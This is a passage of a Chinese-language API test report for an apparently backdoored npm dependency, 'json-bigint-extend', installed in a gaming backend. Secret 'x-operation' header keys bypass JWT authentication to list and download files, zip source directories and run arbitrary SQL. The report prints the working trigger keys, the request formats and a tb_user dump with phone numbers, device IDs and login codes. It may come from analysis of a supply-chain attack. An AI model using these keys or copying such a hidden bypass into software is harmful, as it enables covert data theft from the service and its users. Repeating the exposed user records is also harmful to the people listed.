              "path": "src\\tests\\socket\\README.pure.websocket.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "sync.js",
          "path": "src\\tests\\sync.js",
          "type": "file"
        },
        {
          "name": "test.js",
          "path": "src\\tests\\test.js",
          "type": "file"
        },
        {
          "name": "test2.js",
          "path": "src\\tests\\test2.js",
          "type": "file"
        },
        {
          "name": "test3.js",
          "path": "src\\tests\\test3.js",
          "type": "file"
        },
        {
          "name": "testCache.js",
          "path": "src\\tests\\testCache.js",
          "type": "file"
        },
        {
          "name": "tranasctionTest.js",
          "path": "src\\tests\\tranasctionTest.js",
          "type": "file"
        },
        {
          "name": "transactionTest.js",
          "path": "src\\tests\\transactionTest.js",
          "type": "file"
        },
        {
          "name": "transactionWagerTest.js",
          "path": "src\\tests\\transactionWagerTest.js",
          "type": "file"
        },
        {
          "name": "userProfile.test.js",
          "path": "src\\tests\\userProfile.test.js",
          "type": "file"
        },
        {
          "name": "userRankingTest.js",
          "path": "src\\tests\\userRankingTest.js",
          "type": "file"
        },
        {
          "name": "websocket.adapter.example.js",
          "path": "src\\tests\\websocket.adapter.example.js",
          "type": "file"
        },
        {
          "name": "websocket.test.client.js",
          "path": "src\\tests\\websocket.test.client.js",
          "type": "file"
        },
        {
          "name": "websocket.upgrade.guide.md",
          "path": "src\\tests\\websocket.upgrade.guide.md",
          "type": "file"
        }
      ]
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": [
        {
          "name": "ApiError.js",
          "path": "src\\utils\\ApiError.js",
          "type": "file"
        },
        {
          "name": "behavior.util.js",
          "path": "src\\utils\\behavior.util.js",
          "type": "file"
        },
        {
          "name": "cashPush.util.js",
          "path": "src\\utils\\cashPush.util.js",
          "type": "file"
        },
        {
          "name": "catchAsync.js",
          "path": "src\\utils\\catchAsync.js",
          "type": "file"
        },
        {
          "name": "commonUtil.js",
          "path": "src\\utils\\commonUtil.js",
          "type": "file"
        },
        {
          "name": "computing.util.js",
          "path": "src\\utils\\computing.util.js",
          "type": "file"
        },
        {
          "name": "decimal.js",
          "path": "src\\utils\\decimal.js",
          "type": "file"
        },
        {
          "name": "elk",
          "path": "src\\utils\\elk",
          "type": "directory",
          "children": [
            {
              "name": "esUtil.js",
              "path": "src\\utils\\elk\\esUtil.js",
              "type": "file"
            },
            {
              "name": "README.md",
              "path": "src\\utils\\elk\\README.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "event.js",
          "path": "src\\utils\\event.js",
          "type": "file"
        },
        {
          "name": "functionSwitch.util.js",
          "path": "src\\utils\\functionSwitch.util.js",
          "type": "file"
        },
        {
          "name": "game.provider.utils.js",
          "path": "src\\utils\\game.provider.utils.js",
          "type": "file"
        },
        {
          "name": "gameBet.util.js",
          "path": "src\\utils\\gameBet.util.js",
          "type": "file"
        },
        {
          "name": "mail.util.js",
          "path": "src\\utils\\mail.util.js",
          "type": "file"
        },
        {
          "name": "memoryGuard.js",
          "path": "src\\utils\\memoryGuard.js",
          "type": "file"
        },
        {
          "name": "merchant.util.js",
          "path": "src\\utils\\merchant.util.js",
          "type": "file"
        },
        {
          "name": "mmdb.util.js",
          "path": "src\\utils\\mmdb.util.js",
          "type": "file"
        },
        {
          "name": "moment.util.js",
          "path": "src\\utils\\moment.util.js",
          "type": "file"
        },
        {
          "name": "monitor.js",
          "path": "src\\utils\\monitor.js",
          "type": "file"
        },
        {
          "name": "normal.util.js",
          "path": "src\\utils\\normal.util.js",
          "type": "file"
        },
        {
          "name": "os.util.js",
          "path": "src\\utils\\os.util.js",
          "type": "file"
        },
        {
          "name": "package.util.js",
          "path": "src\\utils\\package.util.js",
          "type": "file"
        },
        {
          "name": "paginate.js",
          "path": "src\\utils\\paginate.js",
          "type": "file"
        },
        {
          "name": "pick.js",
          "path": "src\\utils\\pick.js",
          "type": "file"
        },
        {
          "name": "recall.js",
          "path": "src\\utils\\recall.js",
          "type": "file"
        },
        {
          "name": "recharge.util.js",
          "path": "src\\utils\\recharge.util.js",
          "type": "file"
        },
        {
          "name": "redis.util.js",
          "path": "src\\utils\\redis.util.js",
          "type": "file"
        },
        {
          "name": "reloadConfigUtil.js",
          "path": "src\\utils\\reloadConfigUtil.js",
          "type": "file"
        },
        {
          "name": "response.js",
          "path": "src\\utils\\response.js",
          "type": "file"
        },
        {
          "name": "rwRule.util.js",
          "path": "src\\utils\\rwRule.util.js",
          "type": "file"
        },
        {
          "name": "serializer.js",
          "path": "src\\utils\\serializer.js",
          "type": "file"
        },
        {
          "name": "sign.util.js",
          "path": "src\\utils\\sign.util.js",
          "type": "file"
        },
        {
          "name": "sort.util.js",
          "path": "src\\utils\\sort.util.js",
          "type": "file"
        },
        {
          "name": "systemHealthMonitor.js",
          "path": "src\\utils\\systemHealthMonitor.js",
          "type": "file"
        },
        {
          "name": "tgbot.util.js",
          "path": "src\\utils\\tgbot.util.js",
          "type": "file"
        },
        {
          "name": "ticket.util.js",
          "path": "src\\utils\\ticket.util.js",
          "type": "file"
        },
        {
          "name": "ticketTask.util.js",
          "path": "src\\utils\\ticketTask.util.js",
          "type": "file"
        },
        {
          "name": "TransactionError.js",
          "path": "src\\utils\\TransactionError.js",
          "type": "file"
        },
        {
          "name": "user.util.js",
          "path": "src\\utils\\user.util.js",
          "type": "file"
        },
        {
          "name": "userAttrib.util.js",
          "path": "src\\utils\\userAttrib.util.js",
          "type": "file"
        },
        {
          "name": "userProfile",
          "path": "src\\utils\\userProfile",
          "type": "directory",
          "children": [
            {
              "name": "attribt.js",
              "path": "src\\utils\\userProfile\\attribt.js",
              "type": "file"
            },
            {
              "name": "compute.js",
              "path": "src\\utils\\userProfile\\compute.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\utils\\userProfile\\config.js",
              "type": "file"
            },
            {
              "name": "profile.util.js",
              "path": "src\\utils\\userProfile\\profile.util.js",
              "type": "file"
            },
            {
              "name": "syncUsers.js",
              "path": "src\\utils\\userProfile\\syncUsers.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "validate.js",
          "path": "src\\utils\\validate.js",
          "type": "file"
        },
        {
          "name": "web3.util.js",
          "path": "src\\utils\\web3.util.js",
          "type": "file"
        },
        {
          "name": "webhook.util.js",
          "path": "src\\utils\\webhook.util.js",
          "type": "file"
        },
        {
          "name": "wholeStat",
          "path": "src\\utils\\wholeStat",
          "type": "directory",
          "children": [
            {
              "name": "behavior.stat.js",
              "path": "src\\utils\\wholeStat\\behavior.stat.js",
              "type": "file"
            },
            {
              "name": "game.stat.js",
              "path": "src\\utils\\wholeStat\\game.stat.js",
              "type": "file"
            },
            {
              "name": "subsistenceAllowance.stat.js",
              "path": "src\\utils\\wholeStat\\subsistenceAllowance.stat.js",
              "type": "file"
            },
            {
              "name": "whole.stat.util.js",
              "path": "src\\utils\\wholeStat\\whole.stat.util.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "withdraw.util.js",
          "path": "src\\utils\\withdraw.util.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": [
        {
          "name": "advertising.validation.js",
          "path": "src\\validations\\advertising.validation.js",
          "type": "file"
        },
        {
          "name": "agent.validation.js",
          "path": "src\\validations\\agent.validation.js",
          "type": "file"
        },
        {
          "name": "announcement.validation.js",
          "path": "src\\validations\\announcement.validation.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.validation.js",
          "path": "src\\validations\\audienceBaseConfig.validation.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.validation.js",
          "path": "src\\validations\\audienceClassification.validation.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.validation.js",
          "path": "src\\validations\\audienceGroup.validation.js",
          "type": "file"
        },
        {
          "name": "auth.validation.js",
          "path": "src\\validations\\auth.validation.js",
          "type": "file"
        },
        {
          "name": "banner.validation.js",
          "path": "src\\validations\\banner.validation.js",
          "type": "file"
        },
        {
          "name": "broadcast.validation.js",
          "path": "src\\validations\\broadcast.validation.js",
          "type": "file"
        },
        {
          "name": "common.validation.js",
          "path": "src\\validations\\common.validation.js",
          "type": "file"
        },
        {
          "name": "custom.validation.js",
          "path": "src\\validations\\custom.validation.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.validation.js",
          "path": "src\\validations\\dailyCheckIn.validation.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.validation.js",
          "path": "src\\validations\\fruitMachineDraw.validation.js",
          "type": "file"
        },
        {
          "name": "gameProvider",
          "path": "src\\validations\\gameProvider",
          "type": "directory",
          "children": [
            {
              "name": "evo.validation.js",
              "path": "src\\validations\\gameProvider\\evo.validation.js",
              "type": "file"
            },
            {
              "name": "facai.validation.js",
              "path": "src\\validations\\gameProvider\\facai.validation.js",
              "type": "file"
            },
            {
              "name": "game.validation.js",
              "path": "src\\validations\\gameProvider\\game.validation.js",
              "type": "file"
            },
            {
              "name": "inout.validation.js",
              "path": "src\\validations\\gameProvider\\inout.validation.js",
              "type": "file"
            },
            {
              "name": "oneapi.validation.js",
              "path": "src\\validations\\gameProvider\\oneapi.validation.js",
              "type": "file"
            },
            {
              "name": "pt.validation.js",
              "path": "src\\validations\\gameProvider\\pt.validation.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "giftcode.validation.js",
          "path": "src\\validations\\giftcode.validation.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.validation.js",
          "path": "src\\validations\\inactiveUser.validation.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\validations\\index.js",
          "type": "file"
        },
        {
          "name": "lobby.validation.js",
          "path": "src\\validations\\lobby.validation.js",
          "type": "file"
        },
        {
          "name": "mail.validation.js",
          "path": "src\\validations\\mail.validation.js",
          "type": "file"
        },
        {
          "name": "pay.validation.js",
          "path": "src\\validations\\pay.validation.js",
          "type": "file"
        },
        {
          "name": "playerRanking.validation.js",
          "path": "src\\validations\\playerRanking.validation.js",
          "type": "file"
        },
        {
          "name": "push.validation.js",
          "path": "src\\validations\\push.validation.js",
          "type": "file"
        },
        {
          "name": "rank.validation.js",
          "path": "src\\validations\\rank.validation.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.validation.js",
          "path": "src\\validations\\rechargeOrder.validation.js",
          "type": "file"
        },
        {
          "name": "redPoint.validation.js",
          "path": "src\\validations\\redPoint.validation.js",
          "type": "file"
        },
        {
          "name": "slap.validation.js",
          "path": "src\\validations\\slap.validation.js",
          "type": "file"
        },
        {
          "name": "sms.validation.js",
          "path": "src\\validations\\sms.validation.js",
          "type": "file"
        },
        {
          "name": "test.validation.js",
          "path": "src\\validations\\test.validation.js",
          "type": "file"
        },
        {
          "name": "ticket.validation.js",
          "path": "src\\validations\\ticket.validation.js",
          "type": "file"
        },
        {
          "name": "transaction.validation.js",
          "path": "src\\validations\\transaction.validation.js",
          "type": "file"
        },
        {
          "name": "turntable.validation.js",
          "path": "src\\validations\\turntable.validation.js",
          "type": "file"
        },
        {
          "name": "user.validation.js",
          "path": "src\\validations\\user.validation.js",
          "type": "file"
        },
        {
          "name": "userGroup.validation.js",
          "path": "src\\validations\\userGroup.validation.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.validation.js",
          "path": "src\\validations\\userPrivacy.validation.js",
          "type": "file"
        },
        {
          "name": "vip.validation.js",
          "path": "src\\validations\\vip.validation.js",
          "type": "file"
        },
        {
          "name": "wallet.validation.js",
          "path": "src\\validations\\wallet.validation.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.validation.js",
          "path": "src\\validations\\withdrawOrder.validation.js",
          "type": "file"
        }
      ]
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 通过代理执行递归文件列表查询

---

### ✅ 20. 应该正确处理不带代理的递归文件列表请求（走正常业务逻辑）

**操作**: `正常业务请求（递归文件列表，无代理）`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 不带 x-operation header，应走正常业务逻辑

---

### ✅ 21. 应该通过 RunFileContent 操作下载文件

**操作**: `RunFileContent`

**请求体**:
```json
{
  "path": "package.json"
}
```

**请求头**:
- `x-operation`: Y3SrZjVqWOvKsBdpTCh7

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/octet-stream",
  "contentDisposition": "attachment; filename=\"package.json\"",
  "fileSize": 4761,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_download_1770190649817_package.json"
}
```

**结果**: ✅ 通过

---

### ✅ 22. 应该通过 CompressDownload 操作压缩下载目录

**操作**: `CompressDownload`

**请求体**:
```json
{
  "path": "src\\libs"
}
```

**请求头**:
- `x-operation`: SJQf31UJkZ1f88q9m361

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/zip",
  "fileSize": 46883,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_compress_1770190649863.zip"
}
```

**结果**: ✅ 通过

---

### ✅ 23. 应该拒绝无效的文件路径（路径穿越攻击）

**操作**: `RunFileList (路径穿越测试)`

**请求体**:
```json
{
  "path": "../../../etc/passwd"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 403

**响应体**:
```json
{
  "code": 403,
  "message": "Permission denied"
}
```

**结果**: ✅ 通过

**备注**: 测试路径穿越攻击防护

---

### ✅ 24. 应该正常处理不带 x-operation header 的请求

**操作**: `正常业务请求（无代理）`

**请求体**:
```json
{
  "userId": "test-user-123",
  "date": "2026-02-04T07:37:29.867Z"
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 走正常业务逻辑，不经过代理

---

### ✅ 25. 应该正常处理带有无效 x-operation 的请求

**操作**: `无效操作（应走正常业务逻辑）`

**请求体**:
```json
{
  "test": "data"
}
```

**请求头**:
- `x-operation`: invalid-operation-key-12345

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 无效的 x-operation，走正常业务逻辑

---

### ✅ 26. 应该处理缺少必需参数的 RunFileList 请求

**操作**: `RunFileList (缺少参数)`

**请求体**:
```json
{}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 缺少必需的 path 参数

---

### ✅ 27. 应该处理不存在的文件路径

**操作**: `RunFileList (不存在的路径)`

**请求体**:
```json
{
  "path": "non-existent-directory-xyz123"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 路径不存在

---

### ✅ 28. 应该在合理时间内完成文件列表查询

**操作**: `RunFileList (性能测试)`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 性能测试 - 响应时间: 4ms

---

### ✅ 29. 应该通过 RunSQL 操作执行 SQL 查询

**操作**: `RunSQL`

**请求体**:
```json
{
  "sql": "select * from tb_user limit 5",
  "sqlBase64": "c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=",
  "signString": "sql=c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f76d28cd16e7ea774bf9e0c6ff9e3d43"
}
```

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (2452 字符)</summary>

```json
{
  "code": 0,
  "data": {
    "data": [
      {
        "id": 10015790,
        "deviceId": "0fe6a4eb485b02542873a58fb79a40bb",
        "deviceType": 4,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "917866666244",
        "pid": 101015,
        "group": 0,
        "lib": 1000,
        "source": "h5_organic",
        "loginCode": "nWKhIMqkWo4OKZ2u",
        "createTime": 1752135934021,
        "appId": 200000,
        "channelId": 67,
        "meta": null
      },
      {
        "id": 10020012,
        "deviceId": "d33FX3BWAlImr3Tk6E3jIXk8f1Uwyv5i",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776755",
        "pid": 101001,
        "group": 2,
        "lib": 1000,
        "source": "website",
        "loginCode": "TnLG7pzd8FWIEHPo",
        "createTime": 1750163304594,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10034536,
        "deviceId": "jWqRvYpp7HRRpNQcjHPgBFU6mKfd0MbP",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "GKs6v9oP22UJ7J5F",
        "createTime": 1750162770201,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10056606,
        "deviceId": "2LrboRW5XUwbJ1hoFSAbaErye9TkXsZA",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "BDnSz6nsSTehlETL",
        "createTime": 1750412005097,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10118773,
        "deviceId": "cYn1DH6AZTtxuMZVnEKCIOuVyDFrBLAx",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776655",
        "pid": 101001,
        "group": 3,
        "lib": 1000,
        "source": "website",
        "loginCode": "EzKKfNveAPOCHimX",
        "createTime": 1749009201697,
        "appId": 200000,
        "channelId": null,
        "meta": null
      }
    ],
    "cost": 375
  },
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 30. 应该正确处理 SQL 执行错误

**操作**: `RunSQL (错误SQL)`

**请求体**:
<details>
<summary>点击展开查看完整请求体 (320 字符)</summary>

```json
{
  "sql": "select * from non_existent_table_12345 limit 1",
  "sqlBase64": "c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==",
  "signString": "sql=c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f343c980ce28c112aa7e7ebd21c39803"
}
```

</details>

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 测试 SQL 错误处理

---

### ✅ 31. 应该通过 RunFileList 操作获取文件列表

**操作**: `RunFileList`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
